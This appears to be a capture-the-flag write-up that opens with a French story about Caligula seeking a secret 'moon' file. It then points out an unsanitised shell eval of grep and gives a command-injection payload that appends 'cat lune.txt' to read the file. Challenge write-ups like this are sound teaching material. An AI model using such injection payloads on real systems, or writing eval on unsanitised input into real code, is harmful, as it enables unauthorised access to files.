> # Introduction - Je veux la lune !
>
> Caligula est assis seul devant une table du café. Il y a devant lui 5 tasses vides empilées, et une 6e qu'il sirote lentement, ainsi qu'un ordinateur qu'il regarde fixement. Des cernes profonds creusent son visage. Il lève des yeux étonnamment vifs vers vous alors que vous vous approchez de lui.
>
> Il tend sa main vers son écran d'un air désespéré et s'exclame « Je ne peux plus vivre comme ça, ce monde n'est pas supportable. J'ai besoin de quelque chose de différent. Quelque chose d'impossible, peut-être le bonheur, ou peut-être la lune... Et je sens que ma quête s'approche de sa fin. »
>
> Vous regardez son écran, et voyez qu'il tente d'accéder sans succès à un fichier.
>
> « Vous pensez que je suis fou, mais je n'ai jamais pensé aussi clairement ! » Un calcul rapide vous informe qu'il a probablement consommé plus d'un litre de café, et il n'est que 13h. Vous acquiescez lentement. Il reprend « Regardez, Hélicon m'a enfin rapporté la lune, mais il ne m'a pas donné l'accès... le fourbe. Je brûlerai un quart de sa fortune plus tard pour le punir. Aidez-moi ! »
>
> Entre peur et pitié, vous décidez de l'aider à obtenir le contenu du fichier secret.
> auteur : chlmine#0024

1. After reading the code we can see the following line doesn't sanitize the user input :

```
eval "grep -wie ^$personne informations.txt"
```

2. We can execute command with the following payload :

```
Caligula, lune.txt; cat lune.txt; #
```
